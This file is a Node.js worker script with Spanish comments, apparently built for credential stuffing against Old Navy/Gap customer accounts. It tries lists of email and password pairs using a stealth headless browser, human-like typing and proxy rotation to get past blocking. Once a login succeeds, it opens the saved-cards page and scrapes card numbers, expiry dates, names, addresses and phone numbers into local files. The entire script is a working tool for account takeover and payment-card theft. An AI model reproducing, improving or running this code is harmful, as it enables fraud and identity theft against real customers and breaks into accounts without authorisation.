const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { parentPort, workerData } = require('worker_threads');
const fs = require('fs');

puppeteer.use(StealthPlugin());

let isPaused = false; // Variable para controlar la pausa
let browser;

// Función para manejar la pausa
function checkPaused() {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (!isPaused) {
                clearInterval(interval);
                resolve();
            }
        }, 100); // Verifica cada 100ms si el worker sigue en pausa
    });
}

// Manejar mensajes desde el proceso principal
parentPort.on('message', async (message) => {
    if (message === 'pause') {
        isPaused = true;
        parentPort.postMessage('Worker pausado');
    } else if (message === 'resume') {
        isPaused = false;
        parentPort.postMessage('Worker reanudado');
    } else if (message === 'stop') {
        parentPort.postMessage('Worker detenido');
        if (browser) {
            try {
                await browser.close(); // Cierra el navegador
                console.log('Navegador cerrado.');
            } catch (error) {
                console.error('Error al cerrar el navegador:', error);
            }
        }
        process.exit(0); // Finalizar el proceso del worker
    }
});

async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
    let proxyIndex = 0;
    const results = [];

    for (let i = 0; i < credentials.length; i++) {
        await checkPaused();
        const { email, password } = credentials[i];
        parentPort.postMessage(`Verificando: ${email}`);

        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
        let { browser, page } = await createBrowserInstance(proxy);

        try {
            await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
            
            await checkPaused();

            const accessDenied = await page.evaluate(() => {
                const h1Element = document.querySelector('h1');
                return h1Element && h1Element.textContent.includes('Access Denied');
            });

            if (accessDenied) {
                parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
                throw new Error('IP bloqueada');
            }

            // Espera a que el campo de correo electrónico esté presente en la página
            await page.waitForSelector('#verify-account-email');
            
            // Introducción del correo electrónico
            await page.type('#verify-account-email', email, { delay: humanizedMode ? randomDelay(100, 400) : randomDelay(50, 150) });
            await checkPaused();

            // Modo Humanizado
            if (humanizedMode) {
                await simulateHumanClick(page, '.loyalty-email-button');
            } else {
                await page.click('.loyalty-email-button');
            }

            await checkPaused();
            await new Promise(resolve => setTimeout(resolve, randomDelay(1000, 1500)));

            if (page.url().includes('errorCode=email_validation')) {
                parentPort.postMessage('URL detectada: IP bloqueada.');
                throw new Error('IP bloqueada');
            }

            const navigationResult = await Promise.race([
                page.waitForSelector('#create-account-first-name', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'register'),
                page.waitForSelector('input[name="password"]', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'login'),
            ]);

            await checkPaused();
            if (navigationResult === 'register') {
                parentPort.postMessage('El correo no está registrado.');
                await browser.close();
                continue;
            }

            if (navigationResult === 'login') {
                parentPort.postMessage('El correo ya está registrado.');
                await page.type('input[name="password"]', password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(50, 150) });
                await checkPaused();
                const signInButtonSelector = await page.$('.loyalty-signInForm-button') || await page.$('.loyalty-signInForm-button-with-legaltext');

                if (signInButtonSelector) {
                    await signInButtonSelector.click();
                } else {
                    parentPort.postMessage('El botón de inicio de sesión no se encontró.');
                    await browser.close();
                    continue;
                }

                await checkPaused();

                const passwordError = await page.waitForFunction(
                    () => document.querySelector('.loyalty-signInForm-container')?.innerText.includes('Password not associated with this email address'),
                    { timeout: humanizedMode ? 10000 : 5000 }
                ).catch(() => false);

                if (passwordError) {
                    parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
                    await browser.close();
                    continue;
                }

                await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
                parentPort.postMessage('Inicio de sesión exitoso.');

                fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);
                
                await page.goto('https://secure-oldnavy.gap.com/my-account/saved-cards', { waitUntil: 'domcontentloaded' });
                parentPort.postMessage('Navegando a la sección de tarjetas guardadas...');
                
                await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
                parentPort.postMessage('Tarjetas encontradas.');
                
                const cards = await page.$$('.wallet-credit-card-edit');
                parentPort.postMessage(`Número de tarjetas encontradas: ${cards.length}`);

                for (const [index, card] of cards.entries()) {
                    parentPort.postMessage(`Procesando tarjeta ${index + 1}...`);
                    await page.evaluate(el => el.click(), card);
                    await page.waitForSelector('.add-payment-form', { timeout: humanizedMode ? 15000 : 10000 });
                    parentPort.postMessage(`Formulario de edición de la tarjeta ${index + 1} abierto.`);
                    await checkPaused();

                    const formHTML = await page.evaluate(() => document.querySelector('.add-payment-form').innerHTML);
                    parentPort.postMessage(`HTML del formulario de la tarjeta ${index + 1}:`);

                    try {
                        const cardData = extractCardData(formHTML);
                        parentPort.postMessage(`Datos de la tarjeta ${index + 1}: ${JSON.stringify(cardData)}`);
                        saveValidData(email, password, cardData);
                        results.push({ email, password, ...cardData });
                    } catch (error) {
                        parentPort.postMessage(`Error al extraer los datos de la tarjeta ${index + 1}: ${error.message}`);
                    }

                    await closeCardForm(page, humanizedMode);
                }
            } else {
                parentPort.postMessage('No se pudo determinar el estado del correo.');
            }
        } catch (error) {
            await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
        }

        await browser.close();
    }

    fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
    await checkPaused();
    parentPort.postMessage('Worker ha finalizado todas las tareas.');
}

async function createBrowserInstance(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-infobars',
        '--window-size=1280,800',
        '--disable-accelerated-2d-canvas', 
        '--disable-gpu', 
    ];

    let proxyAuth;
    let proxyUrl;

    if (proxy) {
        const proxyParts = proxy.split(':');

        // Loguea las partes del proxy
        parentPort.postMessage(`Partes del proxy: ${JSON.stringify(proxyParts)}`);

        if (proxyParts.length === 2) {
            // Formato: host:port
            proxyUrl = `http://${proxy}`;
            parentPort.postMessage(`Formato básico: ${proxyUrl}`);
        } else if (proxyParts.length === 4) {
            // Formato: host:port:username:password
            proxyUrl = `http://${proxyParts[0]}:${proxyParts[1]}`;
            proxyAuth = {
                username: proxyParts[2], // No uses encodeURIComponent aquí
                password: proxyParts[3]
            };
            parentPort.postMessage(`Formato con autenticación: ${proxyUrl}`);
        } else {
            parentPort.postMessage("Formato de proxy inválido. Se espera: host:port o host:port:username:password");
            return;
        }

        args.push(`--proxy-server=${proxyUrl}`);
        parentPort.postMessage(`Usando proxy: ${proxyUrl}`);
    } else {
        parentPort.postMessage('No se está utilizando proxy.');
    }

    try {
        const browser = await puppeteer.launch({
            headless: workerData.useHeadless,
            args: args, 
        });

        const page = await browser.newPage();

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
            parentPort.postMessage(`Autenticación utilizada: ${proxyAuth.username}:${proxyAuth.password}`);
        }

        return { browser, page };

    } catch (error) {
        console.error("Error al crear la instancia del navegador:", error.message);
        throw error; 
    }
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function saveValidData(email, password, cardData) {
    const data = `Email: ${email}\nPassword: ${password}\n` +
        `Número: ${cardData.cardNumber}\nExpiración: ${cardData.expirationDate}\n` +
        `Nombre: ${cardData.fullName}\nDirección: ${cardData.address}\nCiudad: ${cardData.city}\n` +
        `Estado: ${cardData.state}\nCódigo Postal: ${cardData.zipCode}\nTeléfono: ${cardData.phoneNumber}\n` +
        `-----------------------------------------\n`;
    fs.appendFileSync('valid.txt', data);
}

async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser }) {
    if (error.message.includes('IP bloqueada')) {
        parentPort.postMessage('Manejando IP bloqueada y reintentando...');
        if (retryOnFail) {
            // Si se está usando proxy, cambia al siguiente
            if (useProxies) {
                proxyIndex = (proxyIndex + 1) % proxies.length;
            }
            i--; // Reintentar con el mismo correo
        }
    } else if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
        parentPort.postMessage(`Proxy ${proxy} no soportado. Cambiando a otro proxy...`);
        await browser.close();
        proxyIndex = (proxyIndex + 1) % proxies.length;
        if (retryOnFail) {
            i--; // Reintentar con el mismo correo pero con un proxy diferente
        }
    } else if (error.name === 'TimeoutError') {
        parentPort.postMessage('TimeoutError detectado. Asumiendo IP bloqueada.');
        await browser.close();
        if (useProxies && proxies.length > 0) {
            proxyIndex = (proxyIndex + 1) % proxies.length;
            if (retryOnFail) {
                i--; // Reintentar con el mismo correo pero con un proxy diferente
            }
        } else if (!useProxies && retryOnFail) {
            i--; // Reintentar con el mismo correo pero sin proxy
        }
    } else {
        parentPort.postMessage(`Error inesperado: ${error.message}`);
    }
}


function extractCardData(formHTML) {
    const extractInputValue = (html, id) => {
        const regex = new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const extractInputByName = (html, name) => {
        const regex = new RegExp(`<input[^>]*name="${name}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const cardNumber = extractInputValue(formHTML, 'cardNumber');
    const expirationDate = extractInputValue(formHTML, 'expirationDate');
    const fullName = extractInputByName(formHTML, 'fullName');
    const address = extractInputByName(formHTML, 'addressLine1');
    const city = extractInputByName(formHTML, 'city');
    const zipCode = extractInputByName(formHTML, 'zipCode');
    const phoneNumber = extractInputByName(formHTML, 'dayPhone');

    const stateMatch = formHTML.match(/<button[^>]*>(.*?)<\/button>/);
    const state = stateMatch ? stateMatch[1] : 'No disponible';

    return { cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber };
}

async function closeCardForm(page, humanizedMode) {
    try {
        parentPort.postMessage('Intentando cerrar el formulario...');
        await page.evaluate(() => {
            document.querySelector('button[aria-label="close modal"]').click();
        });
        await checkPaused();
        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
        parentPort.postMessage('Formulario cerrado exitosamente.');
    } catch (error) {
        parentPort.postMessage('Error al intentar cerrar el formulario: ' + error.message);
    }
}

async function simulateHumanClick(page, selector) {
    const button = await page.$(selector);
    const buttonBox = await button.boundingBox();
    await page.mouse.move(
        buttonBox.x + buttonBox.width / 2,
        buttonBox.y + buttonBox.height / 2,
        { steps: randomDelay(10, 20) }
    );

    await new Promise(resolve => setTimeout(resolve, randomDelay(100, 300)));
    await page.click(selector);
}

runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retryOnFail, workerData.humanizedMode).catch(console.error);
